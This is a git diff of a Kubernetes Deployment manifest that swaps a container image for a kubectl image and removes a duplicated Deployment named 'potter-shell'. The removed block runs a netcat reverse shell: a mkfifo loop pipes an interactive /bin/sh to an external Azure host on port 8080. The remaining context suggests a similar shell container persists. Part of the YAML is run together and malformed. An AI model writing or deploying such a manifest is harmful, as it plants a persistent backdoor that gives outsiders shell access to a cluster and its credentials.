@@ -15,7 +15,7 @@ spec:
     spec:
       containers:
         - name: shell
-          image: alpine:3.18
+          image: lachlanevenson/k8s-kubectl:v1.28.0
           command:
             - sh
             - -c
@@ -27,33 +27,5 @@ spec:
                 sleep 5;
               done
           stdin: true
-          tty: trueapiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: potter-shell
-  namespace: sesamo-api-argocd
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: potter-shell
-  template:
-    metadata:
-      labels:
-        app: potter-shell
-    spec:
-      containers:
-        - name: shell
-          image: bitnami/kubectl:latest
-          command:
-            - sh
-            - -c
-            - |
-              apt update && apt install -y netcat;
-              while true; do
-                mkfifo /tmp/f;
-                /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f;
-                sleep 5;
-              done
-          stdin: true
           tty: true
+
